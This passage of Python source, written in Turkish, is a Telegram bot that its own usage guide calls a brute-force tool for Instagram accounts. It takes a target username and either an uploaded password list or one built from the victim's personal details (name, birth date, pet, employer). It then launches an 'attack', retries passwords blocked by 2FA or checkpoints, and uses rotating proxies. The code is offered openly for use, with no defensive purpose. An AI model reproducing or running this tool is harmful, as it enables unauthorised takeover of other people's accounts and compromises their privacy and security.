                        [InlineKeyboardButton("🔄 Tekrar Dene", callback_data='tekrar_dene')],
                        [InlineKeyboardButton("❌ İptal", callback_data='iptal')]
                    ]
                    yanit_isareti = InlineKeyboardMarkup(klavye)
                    logger.info("Tekrar Dene butonu gönderiliyor...")
                    await ilerleme_geri_donusu("🔄 Bu şifreler doğru olabilir. Tekrar denemek ister misiniz?", reply_markup=yanit_isareti)
                return None
            else:
                await ilerleme_geri_donusu(rapor)
                return None
            
        except Exception as e:
            logger.error(f"Kaba kuvvet hatası: {e}")
            await ilerleme_geri_donusu(f"❌ Beklenmeyen hata: {str(e)}")
            return None

class TelegramBot:
    def __init__(self):
        self.kullanici_verileri = {}
        self.kaba_kuvvet_gorevleri = {}
        self.sifre_olusturucu = SifreOlusturucu()

    def _kullanici_verilerini_baslat(self, kullanici_id: int):
        if kullanici_id not in self.kullanici_verileri:
            self.kullanici_verileri[kullanici_id] = {
                'kullanici_adi': None,
                'sifre_dosyasi': None,
                'sifre_profili': {
                    'ad': '', 'soyad': '', 'dogum_tarihi': '',
                    'evcil_hayvan': '', 'sirket': '', 'anahtar_kelimeler': [],
                    'leet_modu': False, 'ozel_karakterler': False, 'rastgele_sayi': False
                }
            }

    async def baslat(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        kullanici_id = guncelleme.effective_user.id
        self._kullanici_verilerini_baslat(kullanici_id)
        
        banner = """
  _              _            _____                                  
 (_) _ __   ___ | |_   __ _   \_   \ _ __   ___   __ _  _ __    ___ 
 | || '_ \ / __|| __| / _` |   / /\/| '_ \ / __| / _` || '_ \  / _ \
 | || | | |\__ \| |_ | (_| |/\/ /_  | | | |\__ \| (_| || | | ||  __/
 |_||_| |_||___/ \__| \__,_|\____/  |_| |_||___/ \__,_||_| |_| \___|
        """
        
        try:
            await guncelleme.message.reply_text(f"```{banner}```", parse_mode='Markdown')
            await guncelleme.message.reply_text("🔒 Lütfen bot şifresini girin:")
            baglam.user_data['bekleniyor'] = 'sifre'
        except Exception as e:
            logger.error(f"Başlatma hatası: {e}")
            await guncelleme.message.reply_text("❌ Mesaj gönderilirken hata oluştu!")

    async def mesaj_isle(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        kullanici_id = guncelleme.effective_user.id
        self._kullanici_verilerini_baslat(kullanici_id)

        bekleniyor = baglam.user_data.get('bekleniyor')
        
        if not bekleniyor:
            await guncelleme.message.reply_text("❌ Önce /baslat komutunu kullan!")
            return

        if bekleniyor == 'sifre':
            girilen_sifre = guncelleme.message.text.strip()
            if not girilen_sifre:
                await guncelleme.message.reply_text("❌ Boş şifre girilemez!")
                return
            if girilen_sifre == BOT_SIFRE:
                baglam.user_data['bekleniyor'] = None
                hosgeldin_mesaji = "👾 HACKER V3.0 AKTİF! 👾\n🔥 Hoş geldin, V.VV sunar! 🔥"
                
                klavye = [
                    [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='kullanici_adi_ayarla')],
                    [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='sifre_dosyasi_ayarla')],
                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='sifre_listesi_olustur')],
                    [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='saldiri_baslat')],
                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='nasil_kullanilir')],
                    [InlineKeyboardButton("❌ İptal", callback_data='iptal')]
                ]
                
                yanit_isareti = InlineKeyboardMarkup(klavye)
                await guncelleme.message.reply_text(hosgeldin_mesaji, reply_markup=yanit_isareti)
            else:
                await guncelleme.message.reply_text("❌ Yanlış şifre! Tekrar dene.")
            return

        elif bekleniyor == 'kullanici_adi':
            kullanici_adi = guncelleme.message.text.strip()
            if not kullanici_adi:
                await guncelleme.message.reply_text("❌ Boş kullanıcı adı girilemez!")
                return
            if len(kullanici_adi) > 30:
                await guncelleme.message.reply_text("❌ Kullanıcı adı 30 karakterden uzun olamaz!")
                return
            self.kullanici_verileri[kullanici_id]['kullanici_adi'] = kullanici_adi
            await guncelleme.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {kullanici_adi}")
            baglam.user_data['bekleniyor'] = None

        elif bekleniyor == 'sifre_dosyasi':
            if guncelleme.message.document:
                try:
                    dosya = await guncelleme.message.document.get_file()
                    dosya_yolu = f"sifreler_{kullanici_id}.txt"
                    await dosya.download_to_drive(custom_path=dosya_yolu)
                    
                    with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                        sifreler = [satir.strip() for satir in f if satir.strip()]
                    
                    if not sifreler:
                        await guncelleme.message.reply_text("❌ Şifre listesi boş!")
                        os.remove(dosya_yolu)
                        return
                    
                    self.kullanici_verileri[kullanici_id]['sifre_dosyasi'] = dosya_yolu
                    await guncelleme.message.reply_text(f"✅ Şifre listesi yüklendi! ({len(sifreler)} şifre)")
                    baglam.user_data['bekleniyor'] = None
                    
                except Exception as e:
                    await guncelleme.message.reply_text(f"❌ Dosya işlenirken hata: {str(e)}")
            else:
                await guncelleme.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")

        elif bekleniyor == 'sifre_profili':
            try:
                profil_girdisi = guncelleme.message.text.strip().split(',')
                if len(profil_girdisi) < 1:
                    await guncelleme.message.reply_text("❌ Lütfen geçerli bir formatta bilgi gir!")
                    return
                
                profil = {
                    'ad': profil_girdisi[0].strip() if len(profil_girdisi) > 0 else '',
                    'soyad': profil_girdisi[1].strip() if len(profil_girdisi) > 1 else '',
                    'dogum_tarihi': profil_girdisi[2].strip() if len(profil_girdisi) > 2 else '',
                    'evcil_hayvan': profil_girdisi[3].strip() if len(profil_girdisi) > 3 else '',
                    'sirket': profil_girdisi[4].strip() if len(profil_girdisi) > 4 else '',
                    'anahtar_kelimeler': profil_girdisi[5].split() if len(profil_girdisi) > 5 else [],
                    'leet_modu': '-leet' in profil_girdisi,
                    'ozel_karakterler': '-ozel' in profil_girdisi,
                    'rastgele_sayi': '-rast' in profil_girdisi
                }
                
                kelime_listesi = self.sifre_olusturucu.kelime_listesi_olustur(profil)
                if not kelime_listesi:
                    await guncelleme.message.reply_text("❌ Şifre listesi oluşturulamadı! Bilgileri kontrol et.")
                    return
                
                dosya_yolu = f"olusturulan_sifreler_{kullanici_id}.txt"
                with open(dosya_yolu, 'w', encoding='utf-8') as f:
                    for sifre in kelime_listesi:
                        f.write(sifre + '\n')
                
                with open(dosya_yolu, 'rb') as f:
                    await guncelleme.message.reply_document(document=InputFile(f, filename=f"sifreler_{kullanici_id}.txt"),
                                                    caption=f"✅ {len(kelime_listesi)} şifre oluşturuldu!")
                
                self.kullanici_verileri[kullanici_id]['sifre_dosyasi'] = dosya_yolu
                baglam.user_data['bekleniyor'] = None
            except Exception as e:
                await guncelleme.message.reply_text(f"❌ Hata oluştu: {str(e)}")

    async def buton(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        sorgu = guncelleme.callback_query
        await sorgu.answer()
        kullanici_id = sorgu.from_user.id
        self._kullanici_verilerini_baslat(kullanici_id)

        if sorgu.data == 'kullanici_adi_ayarla':
            await sorgu.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
            baglam.user_data['bekleniyor'] = 'kullanici_adi'

        elif sorgu.data == 'sifre_dosyasi_ayarla':
            await sorgu.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
            baglam.user_data['bekleniyor'] = 'sifre_dosyasi'

        elif sorgu.data == 'sifre_listesi_olustur':
            await sorgu.message.reply_text(
                "🔑 Şifre listesi oluşturmak için bilgileri gir:\n"
                "Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler\n"
                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2\n"
                "Not: Doğum tarihi GGAAYYYY formatında olmalı. Anahtar kelimeler boşlukla ayrılmalı.\n"
                "Seçenekler: -leet (leet modu), -ozel (özel karakterler), -rast (rastgele sayılar)\n"
                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -ozel"
            )
            baglam.user_data['bekleniyor'] = 'sifre_profili'

        elif sorgu.data == 'nasil_kullanilir':
            kullanım_kilavuzu = """
            📖 **Bot Kullanım Kılavuzu** 📖
            
            Bu bot, Instagram hesaplarına yönelik bir kaba kuvvet aracıdır. Aşağıdaki adımları takip ederek kullanabilirsiniz:
            
            1. **Şifre Girişi**: Botu başlatmak için /baslat komutunu kullanın ve bot şifresini girin (varsayılan: vio1911).
            
            2. **Kullanıcı Adı Ayarla**: "🎯 Kullanıcı Adı Gir" butonuna tıklayın ve hedef Instagram kullanıcı adını girin.
            
            3. **Şifre Listesi Yükle veya Oluştur**:
               - **Yükle**: "📜 Şifre Listesi Yükle" butonuna tıklayın ve bir .txt dosyası yükleyin (her satırda bir şifre).
               - **Oluştur**: "🔑 Şifre Listesi Oluştur" butonuna tıklayın ve profil bilgilerini girin (ad, soyad, doğum tarihi vb.).
                 Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler,-leet -ozel -rast
                 Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -ozel
            
            4. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
            
            5. **Tekrar Deneme**: Eğer bazı şifreler "doğrulama", "2FA" veya "kontrol noktası" nedeniyle başarısız olduysa, bot bunları listeler ve tekrar denemek isteyip istemediğinizi sorar.
            
            6. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
            
            ⚠️ **Notlar**:
            - Bot, Instagram'ın güvenlik mekanizmalarına (CAPTCHA, 2FA, kontrol noktası) karşı hassastır.
            - Proxy'ler sağlanan listeden ve ücretsiz API'lerden otomatik olarak çekilir.
            - Oluşturulan şifre listesi otomatik olarak kaydedilir ve saldırı için kullanılabilir.
            - Botun kullanımı tamamen kullanıcının sorumluluğundadır.
            
            Sorularınız için bu menüye dönebilirsiniz!
            """
            await sorgu.message.reply_text(kullanım_kilavuzu, parse_mode='Markdown')

        elif sorgu.data == 'saldiri_baslat':
            await self.saldiri_baslat(guncelleme, baglam)

        elif sorgu.data == 'tekrar_dene':
            await self.potansiyel_sifreleri_tekrar_dene(guncelleme, baglam)

        elif sorgu.data == 'iptal':
            baglam.user_data['bekleniyor'] = None
            baglam.user_data.pop('potansiyel_sifreler', None)
            baglam.user_data.pop('kullanici_adi', None)
            await sorgu.message.reply_text("❌ İşlem iptal edildi.")

    async def saldiri_baslat(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        sorgu = guncelleme.callback_query
        await sorgu.answer()
        kullanici_id = sorgu.from_user.id
        
        if not self.kullanici_verileri[kullanici_id]['kullanici_adi']:
            await sorgu.message.reply_text("❌ Önce bir kullanıcı adı ayarla!")
            return
        
        if not self.kullanici_verileri[kullanici_id]['sifre_dosyasi']:
            await sorgu.message.reply_text("❌ Önce bir şifre listesi yükle veya oluştur!")
            return
        
        try:
            with open(self.kullanici_verileri[kullanici_id]['sifre_dosyasi'], 'r', encoding='utf-8', errors='ignore') as f:
                sifreler = [satir.strip() for satir in f if satir.strip()]
        except Exception as e:
            await sorgu.message.reply_text(f"❌ Şifre listesi okunamadı: {str(e)}")
            return
        
        await sorgu.message.reply_text(f"🚀 Saldırı başlatılıyor...\nHedef: {self.kullanici_verileri[kullanici_id]['kullanici_adi']}\nŞifre Sayısı: {len(sifreler)}")
        
        instagram_kaba_kuvvet = InstagramBruteForce()
        
        async def ilerleme_geri_donusu(mesaj, yanit_isareti=None):
            try:
                await sorgu.message.reply_text(mesaj, reply_markup=yanit_isareti)
                logger.info(f"Mesaj gönderildi: {mesaj}")
                await asyncio.sleep(0.5)
            except TelegramError as e:
                logger.error(f"Telegram hatası: {e}")
                await sorgu.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
            except Exception as e:
                logger.error(f"İlerleme geri dönüşü hatası: {e}")
        
        sonuc = await instagram_kaba_kuvvet.kaba_kuvvet(
            self.kullanici_verileri[kullanici_id]['kullanici_adi'],
            sifreler,
            ilerleme_geri_donusu,
            baglam
        )
        
        if sonuc:
            await sorgu.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {sonuc}")
            baglam.user_data.pop('potansiyel_sifreler', None)
            baglam.user_data.pop('kullanici_adi', None)

    async def potansiyel_sifreleri_tekrar_dene(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        sorgu = guncelleme.callback_query
        await sorgu.answer()
        kullanici_id = sorgu.from_user.id
        
        potansiyel_sifreler = baglam.user_data.get('potansiyel_sifreler', [])
        kullanici_adi = baglam.user_data.get('kullanici_adi')
        
        if not kullanici_adi:
            await sorgu.message.reply_text("❌ Kullanıcı adı bulunamadı! Lütfen /baslat ile yeniden başlayın.")
            return
        
        if not potansiyel_sifreler:
            await sorgu.message.reply_text("❌ Tekrar denenecek şifre bulunamadı!")
            return
        
        logger.info(f"{kullanici_adi} için {len(potansiyel_sifreler)} potansiyel şifre tekrar deneniyor")
        await sorgu.message.reply_text(f"🔄 Potansiyel şifreler tekrar deneniyor...\nHedef: {kullanici_adi}\nŞifre Sayısı: {len(potansiyel_sifreler)}")
        
        instagram_kaba_kuvvet = InstagramBruteForce()
        
        async def ilerleme_geri_donusu(mesaj, yanit_isareti=None):
            try:
                await sorgu.message.reply_text(mesaj, reply_markup=yanit_isareti)
                logger.info(f"Mesaj gönderildi: {mesaj}")
                await asyncio.sleep(0.5)
            except TelegramError as e:
                logger.error(f"Telegram hatası: {e}")
                await sorgu.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
            except Exception as e:
                logger.error(f"İlerleme geri dönüşü hatası: {e}")
        
        sonuc = await instagram_kaba_kuvvet.kaba_kuvvet(
            kullanici_adi,
            potansiyel_sifreler,
            ilerleme_geri_donusu,
            baglam
        )
        
        if sonuc:
            await sorgu.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {sonuc}")
            baglam.user_data.pop('potansiyel_sifreler', None)
            baglam.user_data.pop('kullanici_adi', None)
        else:
            await sorgu.message.reply_text("❌ Tekrar denemede şifre bulunamadı.")

def main():
    uygulama = Application.builder().token(TOKEN).build()
    bot = TelegramBot()
    
    uygulama.add_handler(CommandHandler("baslat", bot.baslat))
    uygulama.add_handler(CallbackQueryHandler(bot.buton))
    uygulama.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.mesaj_isle))
    uygulama.add_handler(MessageHandler(filters.Document.ALL, bot.mesaj_isle))
    
    logger.info("Bot başlatılıyor...")
    try:
        uygulama.run_polling()
    except Exception as e:
        logger.error(f"Bot başlatılırken hata: {e}")

if __name__ == '__main__':
    main()
